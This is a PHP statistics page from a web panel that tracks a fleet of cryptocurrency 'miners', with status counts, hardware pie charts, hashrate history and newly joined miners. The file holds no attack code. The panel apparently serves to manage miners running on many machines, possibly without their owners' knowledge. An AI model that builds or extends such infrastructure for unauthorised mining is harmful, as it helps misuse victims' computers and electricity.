<?php
/* Made by Unam Sanctam https://github.com/UnamSanctam */
ini_set('memory_limit', '1024M');
require_once dirname(__DIR__, 1).'/security.php';
require_once dirname(__DIR__, 1).'/assets/php/templates.php';

$charts = '';
if($config['hashrate_history_enable']) {
    $hashratecon = getConn()->query("SELECT hr_algorithm, SUM(hr_hashrate) AS hashrate, hr_date FROM hashrate GROUP BY hr_date, hr_algorithm ORDER BY hr_date");
    $hashrate = $hashratecon->fetchAll(PDO::FETCH_ASSOC);

    if ($hashrate) {
        $hashratearr = [];

        foreach ($hashrate as $value) {
            $hashratearr[$value['hr_algorithm']][] = ['x' =>date('Y-m-d H:i:s', $value['hr_date']), 'y' => $value['hashrate']];
        }

        foreach ($hashratearr as $key => $value) {
            $charts .= unamtCard('col-md-3', "<h4>{$larr['Total']} {$larr['Hashrate']}: {$key}</h4>", '',
                templateHashrateChart($key, $value)
            );
        }
    }
} else {
    $charts .= unamtCard('col-md-3', "<h4>{$larr['Total']} {$larr['Hashrate']}</h4>", '',
        $larr['hashrate_history_disabled']
    );
}

$stats = ['total'=>0, 'offline'=>0];
$newminers = ['today'=>[60*60*24, 0], '3days'=>[60*60*24*3, 0], '7days'=>[60*60*24*7, 0], '30days'=>[60*60*24*30, 0]];
$gpus = [];
$cpus = [];
$algorithms = [];
$versions = [];

$minerscon = getConn()->query("SELECT ms_status, ms_algorithm, ms_version, ms_cpu, ms_gpu, ms_creationDate, ms_lastConnection FROM miners");
$miners = $minerscon->fetchAll(PDO::FETCH_ASSOC);

foreach($miners as $miner) {
    $stats['total']++;
    $timediff = strtotime($currentDate) - strtotime($miner['ms_creationDate']);
    if($miner['ms_lastConnection'] && $timediff > 180){
        $stats['offline']++;
    }else{
        $key = 'status_'.$miner['ms_status'];
        $stats[$key] = isset($stats[$key]) ? $stats[$key]+1 : 1;
    }
    $minergpus = explode(', ', $miner['ms_gpu']);
    foreach($minergpus as $gpu) {
        $gpus[$gpu] = isset($gpus[$gpu]) ? $gpus[$gpu]+1 : 1;
    }
    $minercpus= explode(', ', $miner['ms_cpu']);
    foreach($minercpus as $cpu) {
        $cpus[$cpu] = isset($cpus[$cpu]) ? $cpus[$cpu]+1 : 1;
    }
    foreach($newminers as &$newminer) {
        if($miner['ms_creationDate'] && $timediff < $newminer[0]){
            $newminer[1]++;
        }
    }
    $algorithms[$miner['ms_algorithm']] = isset($algorithms[$miner['ms_algorithm']]) ? $algorithms[$miner['ms_algorithm']]+1 : 1;
    $versions[$miner['ms_version']] = isset($versions[$miner['ms_version']]) ? $versions[$miner['ms_version']]+1 : 1;
}

$minercards = '';

$minercardsdata = [
    'total'=>[$larr['Total'], '', $stats['total']],
    'active'=>[$larr['Active'], 'bg-success', $stats['status_2'] ?? 0],
    'idle'=>["{$larr['Active']} ({$larr['Idle']})", 'bg-success', $stats['status_3'] ?? 0],
    'starting'=>[$larr['Starting'], 'bg-warning', $stats['status_6'] ?? 0],
    'paused'=>[$larr['Paused'], 'bg-warning', $stats['status_4'] ?? 0],
    'vram'=>[$larr['not_enough_free_vram'], 'bg-warning', $stats['status_5'] ?? 0],
    'error'=>[$larr['Error'], 'bg-danger', $stats['status_7'] ?? 0],
    'offline'=>[$larr['Offline'], 'bg-danger', $stats['offline']]
];

function statisticsCard($headtext, $bodytext, $classes = ''){
    return unamtCard('col-lg-3 col-md-3 col-sm-6 col-6', "<h4>{$headtext}</h4>", '',
        $bodytext
        , ['cardclasses'=>$classes]);
}

foreach($minercardsdata as $miner){
    $minercards .= statisticsCard($miner[0], $miner[2], $miner[1]);
}

echo unamtSection($larr['Statistics'],
    unamtRow(
        $minercards
    ).
    unamtRow(
        statisticsCard("{$larr['new_miners']} - {$larr['Today']}", $newminers['today'][1]).
        statisticsCard("{$larr['new_miners']} - 3 {$larr['Days']}", $newminers['3days'][1]).
        statisticsCard("{$larr['new_miners']} - 7 {$larr['Days']}", $newminers['7days'][1]).
        statisticsCard("{$larr['new_miners']} - 30 {$larr['Days']}", $newminers['30days'][1])
    ).
    unamtRow(
        $charts
    ).
    unamtRow(
        unamtCard('col-md-3', "<h4>GPUs</h4>", '',
            unamtChart('gpu', json_encode(['type'=>'pie', 'data'=>['labels'=>array_keys($gpus), 'datasets'=>[['data'=>array_values($gpus)]]], 'options'=>['responsive'=>true]]))
        ).
        unamtCard('col-md-3', "<h4>CPUs</h4>", '',
            unamtChart('gpu', json_encode(['type'=>'pie', 'data'=>['labels'=>array_keys($cpus), 'datasets'=>[['data'=>array_values($cpus)]]], 'options'=>['responsive'=>true]]))
        ).
        unamtCard('col-md-3', "<h4>{$larr['Algorithm']}</h4>", '',
            unamtChart('gpu', json_encode(['type'=>'pie', 'data'=>['labels'=>array_keys($algorithms), 'datasets'=>[['data'=>array_values($algorithms)]]], 'options'=>['responsive'=>true]]))
        ).
        unamtCard('col-md-3', "<h4>{$larr['Version']}</h4>", '',
            unamtChart('gpu', json_encode(['type'=>'pie', 'data'=>['labels'=>array_keys($versions), 'datasets'=>[['data'=>array_values($versions)]]], 'options'=>['responsive'=>true]]))
        )
    )
);